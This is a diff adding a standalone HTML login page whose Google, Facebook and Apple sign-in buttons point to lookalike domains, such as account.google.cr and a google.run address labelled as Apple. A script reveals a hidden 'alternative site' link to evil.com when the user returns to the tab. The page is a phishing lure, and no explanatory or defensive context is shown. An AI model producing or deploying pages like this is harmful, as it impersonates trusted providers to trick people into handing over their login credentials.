@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Login</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-box {
+            background: #ffffff;
+            padding: 40px;
+            border-radius: 8px;
+            width: 320px;
+            text-align: center;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+
+        .login-box h2 {
+            margin-bottom: 20px;
+        }
+
+        .sso-btn {
+            display: block;
+            margin: 10px 0;
+            padding: 12px;
+            text-decoration: none;
+            color: #ffffff;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+
+        .google { background-color: #db4437; }
+        .facebook { background-color: #4267B2; }
+        .apple { background-color: #000000; }
+
+        .alternative {
+            display: none;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .alternative a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .alternative a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <h2>Sign in</h2>
+
+    <a href="https://www.account.google.cr/"
+       class="sso-btn google"
+       target="_blank">Continue with Google</a>
+
+    <a href="https://www.auths.account.facebook.io/"
+       class="sso-btn facebook"
+       target="_blank">Continue with Facebook</a>
+
+    <a href="https://www.aaaaa.auths.account.google.run/"
+       class="sso-btn apple"
+       target="_blank">Continue with Apple</a>
+
+    <div class="alternative" id="altMessage">
+        If SSO login didn’t work,
+        <a href="https://evil.com" target="_blank">
+            click here to check alternative site
+        </a>
+    </div>
+</div>
+
+<script>
+    // Show alternative message when user returns to this tab
+    document.addEventListener("visibilitychange", function () {
+        if (!document.hidden) {
+            document.getElementById("altMessage").style.display = "block";
+        }
+    });
+</script>
+
+</body>
+</html>
